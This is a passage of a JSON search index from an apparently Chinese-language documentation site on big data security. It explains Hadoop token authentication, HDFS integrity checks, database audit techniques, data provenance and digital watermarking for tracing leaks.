token\uff09\u3001\u5757\u8bbf\u95ee\u4ee4\u724c\uff08block access token\uff09\uff0c\u4ee5\u53caMapReduce\u6846\u67b6\u4e2d\u7684\u4efb\u52a1\u4ee4\u724c\uff08job token\uff09\u3002\u4ee4\u724c\u673a\u5236\u7684\u672c\u8d28\u5c31\u662f\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u8282\u70b9\u5171\u4eab\u5bc6\u94a5\uff0c\u670d\u52a1\u7aef\u4e0e\u5ba2\u6237\u7aef\u53ef\u4ee5\u76f8\u4e92\u8ba4\u8bc1\uff0c\u670d\u52a1\u7aef\u5c06\u54cd\u5e94\u5ba2\u6237\u7aef\u7684\u8bbf\u95ee\u3002\u4ee4\u724c\u7531NameNode\u7ba1\u7406\uff0cDataNode\u4e0d\u53c2\u4e0e\u4ee4\u724c\u7684\u7ba1\u7406\u3002 NameNode\u7aef\u4fdd\u5b58\u4e86\u4e00\u4e2a\u968f\u673a\u4ea7\u751f\u7684masterKey\uff0c\u7528\u6765\u4ea7\u751f\u548c\u8bc6\u522b\u4ee4\u724c\uff0c\u6240\u6709\u7684\u4ee4\u724c\u90fd\u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u5e76\u4e14\u6bcf\u4e2a\u4ee4\u724c\u90fd\u6709\u4e00\u4e2a\u8fc7\u671f\u65f6\u95f4\uff0c\u8fc7\u671f\u7684\u4ee4\u724c\u5c06\u88ab\u5220\u9664\u3002\u521d\u59cb\u72b6\u6001\u65f6\uff0c\u5ba2\u6237\u7aef\u5fc5\u987b\u4e0eNameNode\u5efa\u7acb\u4e2a\u7ecf\u8fc7Kerberos\u8ba4\u8bc1\u7684\u8fde\u63a5\uff0c\u4ece\u800c\u83b7\u5f97\u4e00\u4e2a\u6388\u6743\u4ee4\u724c\uff0c\u800c\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7\u4ee4\u724c\u4e0eNameNode\u8fdb\u884c\u4ea4\u4e92\u3002\u5df2\u7ecf\u83b7\u5f97\u4ee4\u724c\u7684\u5ba2\u6237\u7aef\u8bbf\u95eeNameNode\u65f6\uff0c\u5c06TokenID\u53d1\u9001\u5230NameNode\uff0cNameNode\u901a\u8fc7TokenID\u53ef\u4ee5\u5728\u5185\u5b58\u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u4ee4\u724c\uff0c\u5e76\u4e14\u6839\u636emasterKey\u4e0eTokenID\u53ef\u4ee5\u8ba1\u7b97\u51fa\u5171\u4eab\u5bc6\u94a5TokenAuthenticator\u548cDelegation Token\u3002\u5728\u6388\u6743\u4ee4\u724c\u80fd\u88ab\u8ba4\u8bc1\u7684\u57fa\u7840\u4e0a\uff0c\u4ee4\u724c\u8fd8\u9700\u8981\u5468\u671f\u6027\u5730\u4eceNameNode\u66f4\u65b0\uff0c\u4ee5\u4fdd\u8bc1\u79c1\u5bc6\u6027\uff0cNameNode\u4e5f\u4f1a\u5468\u671f\u6027\u7684\u66f4\u65b0masterKey\u4ee5\u4ea7\u751f\u65b0\u7684\u6388\u6743\u4ee4\u724c\u3002 \u5bf9\u4e8e\u5757\u8bbf\u95ee\u4ee4\u724c\u6765\u8bf4\uff0c\u5982\u4f55\u5728NameNode\u4ea7\u751f\u5e76\u4e14\u80fd\u88abDataNode\u8bc6\u522b\u662f\u4e00\u4e2a\u95ee\u9898\uff0cHDFS\u4e2d\uff0c\u8fd9\u4e2a\u95ee\u9898\u901a\u8fc7NameNode\u4e0e\u6240\u6709\u7684DataNode\u4e4b\u95f4\u5171\u4eab\u65b0\u7684\u4e00\u5957\u5bc6\u94a5\u6765\u89e3\u51b3\u3002\u5f53HDFS\u96c6\u7fa4\u542f\u52a8\u65f6\uff0c\u7ecf\u8fc7Kerberos\u8ba4\u8bc1\u7684DataNode\u5411NameNode\u6ce8\u518c\uff0c\u5e76\u4e14\u4eceNameNode\u4e2d\u83b7\u53d6\u5bc6\u94a5key\u3002\u5f53\u5ba2\u6237\u7aef\u8bbf\u95eeNameNode\u65f6\uff0c\u8fd4\u56deDataNode\u4e2d\u6570\u636e\u7684block ID\u548c\u5757\u8bbf\u95ee\u4ee4\u724c\uff0c\u7136\u540e\u5ba2\u6237\u7aef\u5c06\u4ee4\u724c\u53d1\u9001\u5230DataNode\uff0cDataNode\u6839\u636eTokenID\u4e2d\u7684key ID\u786e\u5b9a\u9700\u8981\u7528\u54ea\u4e2a\u5bc6\u94a5key\uff0c\u5e76\u901a\u8fc7Key\u548cTokenID\u91cd\u65b0\u8ba1\u7b97TokenAuthenticator\uff0c\u5e76\u4e14\u548c\u5757\u8bbf\u95ee\u4ee4\u724c\u4e2d\u7684TokenAuthenticator\u8fdb\u884c\u6bd4\u8f83\u5c31\u53ef\u4ee5\u786e\u5b9a\u662f\u5426\u80fd\u591f\u901a\u8fc7\u8ba4\u8bc1\uff0c\u5ba2\u6237\u7aef\u4f1a\u5c06\u6240\u6709\u7684DataNode\u4ee4\u724c\u90fd\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\u91cd\u590d\u4f7f\u7528\uff0c\u76f4\u5230\u8fc7\u671f\u624d\u4f1a\u4ece\u65b0\u4eceNameNode\u83b7\u53d6\u3002\u7531\u4e8e\u5757\u8bbf\u95ee\u4ee4\u724c\u90fd\u662f\u8f7b\u91cf\u7ea7\u7684\u548c\u4e34\u65f6\u7684\uff0c\u56e0\u6b64DataNode\u4e2d\u7684\u4ee4\u724c\u4e0d\u9700\u8981\u5468\u671f\u6027\u5730\u66f4\u65b0\uff0c\u53ea\u9700\u8981\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\uff0c\u4e00\u8fc7\u671f\u624d\u8fdb\u884c\u66f4\u65b0\u3002","title":"03.04.02 \u57fa\u4e8e\u4ee4\u724c\u7684\u8ba4\u8bc1\u673a\u5236"},{"location":"data_security/big_data_security_copy/#030403","text":"HDFS\u7684\u6570\u636e\u5b8c\u6574\u6027\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff1a\u6570\u636e\u8bbf\u95ee\u7684\u5b8c\u6574\u6027\u548c\u6570\u636e\u4f20\u8f93\u7684\u5b8c\u6574\u6027\u3002 \u6570\u636e\u8bbf\u95ee\u7684\u5b8c\u6574\u6027\uff1aHDFS\u4e3b\u8981\u5b9e\u73b0\u4e86CRC32\u6821\u9a8c\u3002HDFS\u5ba2\u6237\u7aef\u5728\u8bbf\u95eeDataNode\u6570\u636e\u5757\u65f6\uff0c\u662f\u901a\u8fc7socket\u7684\u65b9\u5f0f\u83b7\u53d6\u6570\u636e\u6d41\uff0cHadoop\u5728FSInputStream\u548cFSoutputStream\u7684\u57fa\u7840\u4e0a\uff0c\u5b9e\u73b0\u4e24\u4e2a\u652f\u6301\u6821\u9a8c\u548c\u7684\u7c7b\u548c\u6587\u4ef6\u7cfb\u7edf\uff0cFSInputStream\u548cFSoutputStream\u4f7f\u7528\u6570\u636e\u6d41\u652f\u6301\u6821\u9a8c\u548c\u3002\u5728\u5ba2\u6237\u7aef\u5199\u5165\u4e00\u4e2a\u65b0\u7684HDFS\u6587\u4ef6\u65f6\uff0c\u4f1a\u8ba1\u7b97\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u5305\u62ec\u7684\u6240\u6709\u6570\u636e\u5757\u7684\u6821\u9a8c\u548c\uff0c\u5e76\u5c06\u6821\u9a8c\u548c\u4f5c\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684.crc\u6587\u4ef6\u683c\u5f0f\u7684\u9690\u85cf\u6587\u4ef6\uff0c\u4e0e\u6570\u636e\u6587\u4ef6\u4fdd\u5b58\u5728\u540c\u4e00\u547d\u540d\u7a7a\u95f4\u3002 \u6570\u636e\u4f20\u8f93\u7684\u5b8c\u6574\u6027\uff1aHDFS\u6570\u636e\u5757\u7684\u5b58\u50a8\u652f\u6301\u5b8c\u6574\u6027\u9a8c\u8bc1\uff0c\u4e3b\u8981\u901a\u8fc7\u6838\u5fc3\u7c7bDataBlockScanner\u7c7b\u5b9e\u73b0\uff0c\u5b83\u901a\u8fc7\u5728DataNode\u7684\u540e\u53f0\u6267\u884c\u4e00\u4e2a\u72ec\u7acb\u7684\u626b\u63cf\u7ebf\u7a0b\u7684\u65b9\u5f0f\uff0c\u5468\u671f\u6027\u5730\u5bf9DataNode\u6240\u7ba1\u7406\u7684\u6570\u636e\u5757\u8fdb\u884cCRC\u6821\u9a8c\u548c\u68c0\u67e5\u3002\u5f53\u5b83\u626b\u63cf\u53d1\u73b0\u6570\u636e\u5757\u7684\u6821\u9a8c\u548c\u548c\u539f\u5148\u4e0d\u4e00\u81f4\uff0c\u5c06\u5bf9\u6570\u636e\u5757\u8fdb\u884c\u5176\u4ed6\u8f85\u52a9\u64cd\u4f5c\uff0c\u4f8b\u5982\uff1a\u5220\u9664\u5931\u6548\u7684\u6570\u636e\u5757\u7b49\u3002","title":"03.04.03 \u6570\u636e\u5b8c\u6574\u6027\u4e0e\u4e00\u81f4\u6027"},{"location":"data_security/big_data_security_copy/#04","text":"","title":"04 \u6570\u636e\u53d1\u5e03\u5b89\u5168\u6280\u672f"},{"location":"data_security/big_data_security_copy/#0401","text":"\u5b89\u5168\u5ba1\u8ba1\u662f\u6307\u5728\u8bb0\u5f55\u4e00\u5207\uff08\u6216\u90e8\u5206\uff09\u4e0e\u7cfb\u7edf\u5b89\u5168\u6709\u5173\u6d3b\u52a8\u7684\u57fa\u7840\u4e0a\uff0c\u5bf9\u5176\u8fdb\u884c\u5206\u6790\u5904\u7406\u3001\u8bc4\u4f30\u5ba1\u67e5\uff0c\u67e5\u627e\u5b89\u5168\u9690\u60a3\uff0c\u5bf9\u7cfb\u7edf\u5b89\u5168\u8fdb\u884c\u5ba1\u6838\u3001\u7a3d\u67e5\u548c\u8ba1\u7b97\uff0c\u8ffd\u67e5\u4e8b\u6545\u7684\u539f\u56e0\uff0c\u5e76\u4f5c\u51fa\u8fdb\u4e00\u6b65\u7684\u5904\u7406\u3002","title":"04.01 \u5b89\u5168\u5ba1\u8ba1"},{"location":"data_security/big_data_security_copy/#040101","text":"SQL\u6570\u636e\u5e93\u548cNoSQL\u6570\u636e\u5e93\u5747\u5177\u6709\u65e5\u5fd7\u5ba1\u8ba1\u7684\u529f\u80fd\uff0c\u901a\u8fc7\u914d\u7f6e\u6570\u636e\u5e93\u7684\u81ea\u5ba1\u8ba1\u529f\u80fd\uff0c\u5373\u53ef\u5b9e\u73b0\u5bf9\u5927\u6570\u636e\u7684\u5ba1\u8ba1\uff0c\u5176\u90e8\u7f72\u65b9\u5f0f\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u65e5\u5fd7\u5ba1\u8ba1\u80fd\u591f\u5bf9\u7f51\u7edc\u64cd\u4f5c\u53ca\u672c\u5730\u64cd\u4f5c\u6570\u636e\u7684\u884c\u4e3a\u8fdb\u884c\u5ba1\u8ba1\uff0c\u7531\u4e8e\u4f9d\u6258\u4e8e\u73b0\u6709\u7684\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\uff0c\u517c\u5bb9\u6027\u5f88\u597d\u3002\u4f46\u8fd9\u79cd\u5ba1\u8ba1\u6280\u672f\u7684\u7f3a\u70b9\u4e5f\u6bd4\u8f83\u660e\u663e\uff0c\u9996\u5148\u5728\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u4e0a\u5f00\u542f\u81ea\u8eab\u65e5\u5fd7\u5ba1\u8ba1\u5bf9\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u7684\u6027\u80fd\u6709\u5f71\u54cd\uff0c\u7279\u522b\u662f\u5728\u5927\u6d41\u91cf\u60c5\u51b5\u4e0b\u635f\u8017\u8f83\u5927\uff1b\u5176\u6b21\u65e5\u5fd7\u5ba1\u8ba1\u5728\u8bb0\u5f55\u7684\u7ec6\u7c92\u5ea6\u4e0a\u8f83\u5dee\uff0c\u7f3a\u5c11\u4e00\u4e9b\u5173\u952e\u4fe1\u606f\uff0c\u5982\uff1a\u6e90IP\u3001SQL\u8bed\u53e5\u7b49\uff0c\u5ba1\u8ba1\u6eaf\u6e90\u6548\u679c\u4e0d\u597d\uff1b\u6700\u540e\u5c31\u662f\u65e5\u5fd7\u5ba1\u8ba1\u9700\u8981\u5230\u6bcf\u4e00\u53f0\u88ab\u5ba1\u8ba1\u4e3b\u673a\u4e0a\u8fdb\u884c\u914d\u7f6e\u548c\u67e5\u770b\uff0c\u8f83\u96be\u8fdb\u884c\u7edf\u4e00\u7684\u5ba1\u8ba1\u7b56\u7565\u914d\u7f6e\u548c\u65e5\u5fd7\u5206\u6790\u3002","title":"04.01.01 \u57fa\u4e8e\u65e5\u5fd7\u7684\u5ba1\u8ba1\u6280\u672f"},{"location":"data_security/big_data_security_copy/#040102","text":"\u57fa\u4e8e\u7f51\u7edc\u76d1\u542c\u7684\u5ba1\u8ba1\u6280\u672f\u662f\u901a\u8fc7\u5c06\u5bf9\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u7684\u8bbf\u95ee\u6d41\u91cf\u955c\u50cf\u5230\u4ea4\u6362\u673a\u67d0\u4e00\u4e2a\u7aef\u53e3\uff0c\u7136\u540e\u901a\u8fc7\u4e13\u7528\u786c\u4ef6\u8bbe\u5907\u5bf9\u8be5\u7aef\u53e3\u6d41\u91cf\u8fdb\u884c\u5206\u6790\u548c\u8fd8\u539f\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9\u6570\u636e\u8bbf\u95ee\u7684\u5ba1\u8ba1\u3002\u5176\u5178\u578b\u90e8\u7f72\u793a\u610f\u56fe\u5982\u4e0b\uff1a \u57fa\u4e8e\u7f51\u7edc\u76d1\u542c\u7684\u5ba1\u8ba1\u6280\u672f\u6700\u5927\u7684\u4f18\u70b9\u5c31\u662f\u4e0e\u73b0\u6709\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u65e0\u5173\uff0c\u90e8\u7f72\u8fc7\u7a0b\u4e0d\u4f1a\u7ed9\u6570\u636e\u5e93\u7cfb\u7edf\u5e26\u6765\u6027\u80fd\u4e0a\u7684\u8d1f\u62c5\uff0c\u5373\u4f7f\u662f\u51fa\u73b0\u6545\u969c\u4e5f\u4e0d\u4f1a\u5f71\u54cd\u6570\u636e\u5e93\u7cfb\u7edf\u7684\u6b63\u5e38\u8fd0\u884c\uff0c\u5177\u5907\u6613\u90e8\u7f72\u3001\u65e0\u98ce\u9669\u7684\u7279\u70b9\uff1b\u4f46\u662f\uff0c\u5176\u90e8\u7f72\u7684\u5b9e\u73b0\u539f\u7406\u51b3\u5b9a\u4e86\u7f51\u7edc\u76d1\u542c\u6280\u672f\u5728\u9488\u5bf9\u52a0\u5bc6\u534f\u8bae\u65f6\uff0c\u53ea\u80fd\u5b9e\u73b0\u5230\u4f1a\u8bdd\u7ea7\u522b\u5ba1\u8ba1\uff0c\u5373\u53ef\u4ee5\u5ba1\u8ba1\u5230\u65f6\u95f4\u3001\u6e90IP\u3001\u6e90\u7aef\u53e3\u3001\u76ee\u7684IP\u3001\u76ee\u7684\u7aef\u53e3\u7b49\u4fe1\u606f\uff0c\u800c\u65e0\u6cd5\u5bf9\u5185\u5bb9\u8fdb\u884c\u5ba1\u8ba1\u3002","title":"04.01.02 \u57fa\u4e8e\u7f51\u7edc\u76d1\u542c\u7684\u5ba1\u8ba1\u6280\u672f"},{"location":"data_security/big_data_security_copy/#040103","text":"\u57fa\u4e8e\u7f51\u5173\u7684\u5ba1\u8ba1\u6280\u672f\u901a\u8fc7\u5728\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u5728\u90e8\u7f72\u7f51\u5173\u8bbe\u5907\uff0c\u5728\u7ebf\u622a\u83b7\u5e76\u8f6c\u53d1\u5230\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u7684\u6d41\u91cf\u800c\u5b9e\u73b0\u5ba1\u8ba1\uff0c\u5176\u5178\u578b\u90e8\u7f72\u793a\u610f\u5982\u4e0b\u56fe\u6240\u793a\uff1a","title":"04.01.03 \u57fa\u4e8e\u7f51\u5173\u7684\u5ba1\u8ba1\u6280\u672f"},{"location":"data_security/big_data_security_copy/#040104","text":"\u57fa\u4e8e\u4ee3\u7406\u7684\u5ba1\u8ba1\u6280\u672f\u662f\u901a\u8fc7\u5728\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u4e2d\u5b89\u88c5\u76f8\u5e94\u7684\u5ba1\u8ba1Agent\uff08\u4ee3\u7406\uff09\uff0c\u5728Agent\u4e0a\u5b9e\u73b0\u5ba1\u8ba1\u7b56\u7565\u7684\u914d\u7f6e\u548c\u65e5\u5fd7\u7684\u91c7\u96c6\uff0c\u8be5\u6280\u672f\u4e0e\u65e5\u5fd7\u5ba1\u8ba1\u6280\u672f\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u6700\u5927\u7684\u4e0d\u540c\u5c31\u662f\u9700\u8981\u5728\u88ab\u5ba1\u8ba1\u4e3b\u673a\u4e0a\u5b89\u88c5\u4ee3\u7406\u7a0b\u5e8f\u3002\u4ee3\u7406\u5ba1\u8ba1\u6280\u672f\u4ece\u5ba1\u8ba1\u7c92\u5ea6\u4e0a\u8981\u4f18\u4e8e\u65e5\u5fd7\u5ba1\u8ba1\u6280\u672f\u3002\u5728\u5927\u6570\u636e\u73af\u5883\u4e0b\uff0c\u6570\u636e\u5b58\u50a8\u4e8e\u591a\u79cd\u6570\u636e\u5e93\u7cfb\u7edf\u4e2d\uff0c\u9700\u8981\u540c\u65f6\u5ba1\u8ba1\u591a\u79cd\u5b58\u50a8\u67b6\u6784\u7684\u6570\u636e\uff0c\u539f\u5b58\u50a8\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\u3001\u53ef\u9760\u6027\u3001\u6027\u80fd\u6216\u591a\u6216\u5c11\u90fd\u4f1a\u6709\u4e00\u4e9b\u5f71\u54cd\uff0c\u56e0\u6b64\u57fa\u4e8e\u4ee3\u7406\u7684\u5ba1\u8ba1\u6280\u672f\u5b9e\u9645\u7684\u5e94\u7528\u9762\u8f83\u7a84\u3002 \u901a\u8fc7\u5bf9\u6bd4\u4ee5\u4e0a4\u79cd\u6280\u672f\u7684\u5206\u6790\uff0c\u5728\u8fdb\u884c\u5927\u6570\u636e\u8f93\u51fa\u5b89\u5168\u5ba1\u8ba1\u6280\u672f\u65b9\u6848\u7684\u9009\u62e9\u65f6\uff0c\u9700\u8981\u4ece\u7a33\u5b9a\u6027\u3001\u53ef\u9760\u6027\u3001\u53ef\u7528\u6027\u7b49\u591a\u65b9\u9762\u8fdb\u884c\u8003\u8651\uff0c\u7279\u522b\u662f\u6280\u672f\u65b9\u6848\u7684\u9009\u62e9\u4e0d\u5e94\u5bf9\u73b0\u6709\u7cfb\u7edf\u9020\u6210\u5f71\u54cd\uff0c\u53ef\u4ee5\u4f18\u5148\u9009\u7528\u7f51\u7edc\u76d1\u542c\u5ba1\u8ba1\u6280\u672f\u6765\u5b9e\u73b0\u5bf9\u5927\u6570\u636e\u8f93\u51fa\u7684\u5b89\u5168\u5ba1\u8ba1\u3002","title":"04.01.04 \u57fa\u4e8e\u4ee3\u7406\u7684\u5ba1\u8ba1\u6280\u672f"},{"location":"data_security/big_data_security_copy/#0402","text":"\u6570\u636e\u6eaf\u6e90\u662f\u4e00\u4e2a\u65b0\u5174\u7684\u7814\u7a76\u9886\u57df\uff0c\u8d77\u6e90\u4e8e20\u4e16\u7eaa90\u5e74\u4ee3\uff0c\u666e\u904d\u7406\u89e3\u4e3a\u8ffd\u8e2a\u6570\u636e\u7684\u8d77\u6e90\u548c\u91cd\u73b0\u6570\u636e\u7684\u5386\u53f2\u72b6\u6001\uff0c\u76ee\u524d\u8fd8\u6ca1\u6709\u516c\u8ba4\u7684\u5b9a\u4e49\u3002\u5728\u5927\u6570\u636e\u5e94\u7528\u9886\u57df\uff0c\u6570\u636e\u6eaf\u6e90\u5c31\u662f\u5bf9\u5927\u6570\u636e\u5e94\u7528\u5468\u671f\u7684\u5404\u4e2a\u73af\u8282\u7684\u64cd\u4f5c\u8fdb\u884c\u6807\u8bb0\u548c\u5b9a\u4f4d\uff0c\u5728\u53d1\u751f\u6570\u636e\u5b89\u5168\u95ee\u9898\u65f6\uff0c\u53ef\u4ee5\u53ca\u65f6\u51c6\u786e\u5730\u5b9a\u4f4d\u5230\u51fa\u73b0\u95ee\u9898\u7684\u73af\u8282\u548c\u8d23\u4efb\u8005\uff0c\u4ee5\u4fbf\u4e8e\u5bf9\u6570\u636e\u5b89\u5168\u95ee\u9898\u7684\u89e3\u51b3\u3002 \u76ee\u524d\u5b66\u672f\u754c\u5bf9\u6570\u636e\u6eaf\u6e90\u7684\u7406\u8bba\u7814\u7a76\u4e3b\u8981\u57fa\u4e8e\u6570\u636e\u96c6\u6eaf\u6e90\u7684\u6a21\u578b\u548c\u65b9\u6cd5\u5c55\u5f00\uff0c\u4e3b\u8981\u7684\u65b9\u6cd5\u6709\u6807\u6ce8\u6cd5\u548c\u53cd\u5411\u67e5\u8be2\u6cd5\uff0c\u8fd9\u4e9b\u9632\u8303\u90fd\u662f\u57fa\u4e8e\u5bf9\u6570\u636e\u64cd\u4f5c\u8bb0\u5f55\u7684\uff0c\u5bf9\u4e8e\u6076\u610f\u7a83\u53d6\u3001\u975e\u6cd5\u8bbf\u95ee\u8005\u6765\u8bf4\uff0c\u5f88\u5bb9\u6613\u7834\u574f\u6570\u636e\u6eaf\u6e90\u4fe1\u606f\uff0c\u5728\u5e94\u7528\u65b9\u9762\uff0c\u5305\u62ec\u6570\u636e\u5e93\u5e94\u7528\u3001\u5de5\u4f5c\u6d41\u5e94\u7528\u548c\u5176\u4ed6\u65b9\u9762\u7684\u5e94\u7528\uff0c\u76ee\u524d\u90fd\u5904\u5728\u7814\u7a76\u8282\u70b9\uff0c\u6ca1\u6709\u6210\u719f\u7684\u5e94\u7528\u6a21\u5f0f\u3002\u5927\u591a\u6570\u6eaf\u6e90\u7cfb\u7edf\u90fd\u662f\u5728\u4e00\u4e2a\u72ec\u7acb\u7684\u7cfb\u7edf\u5185\u90e8\u5b9e\u73b0\u6eaf\u6e90\u7ba1\u7406\uff0c\u6570\u636e\u5982\u4f55\u5728\u591a\u4e2a\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e4b\u95f4\u8f6c\u6362\u6216\u4f20\u64ad\uff0c\u6ca1\u6709\u7edf\u4e00\u7684\u4e1a\u754c\u6807\u51c6\uff0c\u968f\u7740\u4e91\u8ba1\u7b97\u548c\u5927\u6570\u636e\u73af\u5883\u7684\u4e0d\u65ad\u53d1\u5c55\uff0c\u6570\u636e\u6eaf\u6e90\u95ee\u9898\u53d8\u5f97\u8d8a\u6765\u8d8a\u91cd\u8981\uff0c\u9010\u6e10\u6210\u4e3a\u7814\u7a76\u7684\u70ed\u70b9\u3002","title":"04.02 \u6570\u636e\u6eaf\u6e90"},{"location":"data_security/big_data_security_copy/#040201","text":"\u6570\u5b57\u6c34\u5370\u662f\u5c06\u4e00\u4e9b\u6807\u8bc6\u4fe1\u606f\uff08\u5373\u6570\u5b57\u6c34\u5370\uff09\u76f4\u63a5\u5d4c\u5165\u6570\u5b57\u8f7d\u4f53\uff08\u5305\u62ec\uff1a\u591a\u5a92\u4f53\u3001\u6587\u6863\u3001\u8f6f\u4ef6\uff09\u4e2d\uff0c\u4f46\u4e0d\u5f71\u54cd\u539f\u8f7d\u4f53\u7684\u4f7f\u7528\u4ef7\u503c\uff0c\u4e5f\u4e0d\u5bb9\u6613\u88ab\u4eba\u7684\u77e5\u89c9\u7cfb\u7edf\uff08\u5982\uff1a\u89c6\u89c9\u6216\u542c\u89c9\u7cfb\u7edf\uff09\u89c9\u5bdf\u6216\u6ce8\u610f\u5230\u3002\u901a\u8fc7\u8fd9\u4e9b\u9690\u85cf\u5728\u8f7d\u4f53\u4e2d\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u8fbe\u5230\u786e\u8ba4\u5185\u5bb9\u521b\u5efa\u8005\u3001\u8d2d\u4e70\u8005\u3001\u4f20\u9001\u9690\u79d8\u4fe1\u606f\u6216\u8005\u5224\u65ad\u8f7d\u4f53\u662f\u5426\u88ab\u7be1\u6539\u7684\u76ee\u7684\u3002\u6570\u5b57\u6c34\u5370\u7684\u4e3b\u8981\u7279\u5f81\u6709\u5982\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a \u4e0d\u53ef\u611f\u77e5\u6027\uff1a\u4e5f\u5305\u62ec\u89c6\u89c9\u4e0a\u7684\u4e0d\u53ef\u89c1\u6027\u548c\u6c34\u5370\u7b97\u6cd5\u7684\u4e0d\u53ef\u63a8\u65ad\u6027\u3002 \u5f3a\u58ee\u6027\uff1a\u5d4c\u5165\u6c34\u5370\u96be\u4ee5\u88ab\u4e00\u822c\u7b97\u6cd5\u6e05\u9664\uff0c\u62b5\u6297\u5404\u79cd\u5bf9\u6570\u636e\u7684\u7834\u574f\u3002 \u53ef\u8bc1\u660e\u6027\uff1a\u5bf9\u5d4c\u5165\u6c34\u5370\u4fe1\u606f\u7684\u56fe\u50cf\uff0c\u53ef\u4ee5\u901a\u8fc7\u6c34\u5370\u68c0\u6d4b\u5668\u8bc1\u660e\u5d4c\u5165\u6c34\u5370\u7684\u5b58\u5728\u3002 \u81ea\u6062\u590d\u6027\uff1a\u542b\u6709\u6c34\u5370\u7684\u56fe\u50cf\u5728\u7ecf\u53d7\u4e00\u7cfb\u5217\u653b\u51fb\u540e\uff0c\u6c34\u5370\u4fe1\u606f\u4e5f\u7ecf\u8fc7\u4e86\u5404\u79cd\u64cd\u4f5c\u6216\u53d8\u6362\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u4e00\u5b9a\u7684\u7b97\u6cd5\u4ece\u5269\u4f59\u7684\u56fe\u50cf\u7247\u6bb5\u4e2d\u6062\u590d\u51fa\u6c34\u5370\u4fe1\u606f\uff0c\u800c\u4e0d\u9700\u8981\u6574\u6539\u539f\u59cb\u56fe\u50cf\u7684\u7279\u5f81\u3002 \u5b89\u5168\u4fdd\u5bc6\u6027\uff1a\u7761\u59ff\u6c34\u5370\u7cfb\u7edf\u4f7f\u7528\u4e00\u4e2a\u6216\u591a\u4e2a\u5bc6\u94a5\u4ee5\u786e\u4fdd\u5b89\u5168\uff0c\u9632\u6b62\u4fee\u6539\u548c\u64e6\u9664\u3002 \u6570\u5b57\u6c34\u5370\u5229\u7528\u6570\u636e\u9690\u85cf\u539f\u7406\u4f7f\u6c34\u5370\u6807\u5fd7\u4e0d\u53ef\u89c1\uff0c\u65e2\u4e0d\u635f\u5bb3\u539f\u6570\u636e\uff0c\u53c8\u8fbe\u5230\u4e86\u5bf9\u6570\u636e\u8fdb\u884c\u6807\u8bb0\u7684\u76ee\u7684\u3002\u5229\u7528\u8fd9\u79cd\u9690\u85cf\u6807\u8bc6\u7684\u65b9\u6cd5\uff0c\u6807\u8bc6\u4fe1\u606f\u5728\u539f\u59cb\u6570\u636e\u4e0a\u662f\u770b\u4e0d\u5230\uff0c\u53ea\u6709\u901a\u8fc7\u7279\u6b8a\u7684\u9605\u8bfb\u7a0b\u5e8f\u624d\u53ef\u4ee5\u8bfb\u53d6\uff0c\u57fa\u4e8e\u6570\u5b57\u6c34\u5370\u7684\u7be1\u6539\u63d0\u793a\u662f\u89e3\u51b3\u6570\u636e\u7be1\u6539\u95ee\u9898\u7684\u7406\u60f3\u6280\u672f\u9014\u5f84\u3002 \u57fa\u4e8e\u6570\u5b57\u6c34\u5370\u6280\u672f\u7684\u4ee5\u4e0a\u6027\u8d28\uff0c\u53ef\u4ee5\u5c06\u6570\u5b57\u6c34\u5370\u5f15\u5165\u5927\u6570\u636e\u5e94\u7528\u9886\u57df\uff0c\u89e3\u51b3\u6570\u636e\u6eaf\u6e90\u95ee\u9898\u3002\u5728\u6570\u636e\u53d1\u5e03\u51fa\u53e3\uff0c\u53ef\u4ee5\u5efa\u7acb\u6570\u5b57\u6c34\u5370\u52a0\u8f7d\u673a\u5236\uff0c\u5728\u8fdb\u884c\u6570\u636e\u53d1\u5e03\u65f6\uff0c\u9488\u5bf9\u91cd\u8981\u6570\u636e\uff0c\u4e3a\u6bcf\u4e2a\u8bbf\u95ee\u8005\u83b7\u5f97\u7684\u6570\u636e\u52a0\u8f7d\u552f\u4e00\u7684\u6570\u5b57\u6c34\u5370\u3002\u5f53\u53d1\u751f\u673a\u5bc6\u6cc4\u9732\u6216\u9690\u79c1\u95ee\u9898\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6c34\u5370\u63d0\u53d6\u7684\u65b9\u5f0f\uff0c\u68c0\u67e5\u53d1\u751f\u95ee\u9898\u7684\u6570\u636e\u662f\u53d1\u5e03\u7ed9\u54ea\u4e2a\u6570\u636e\u8bbf\u95ee\u8005\u7684\uff0c\u4ece\u800c\u786e\u5b9a\u6570\u636e\u6cc4\u9732\u7684\u6e90\u5934\uff0c\u53ca\u65f6\u8fdb\u884c\u5904\u7406\u3002","title":"04.02.01 \u5c06\u4fe1\u606f\u5b89\u5168\u9886\u57df\u7684\u6570\u5b57\u6c34\u5370\u6280\u672f\u7528\u4e8e\u6eaf\u6e90"},{"location":"data_security/big_data_security_copy/#05-apt","text":"","title":"05 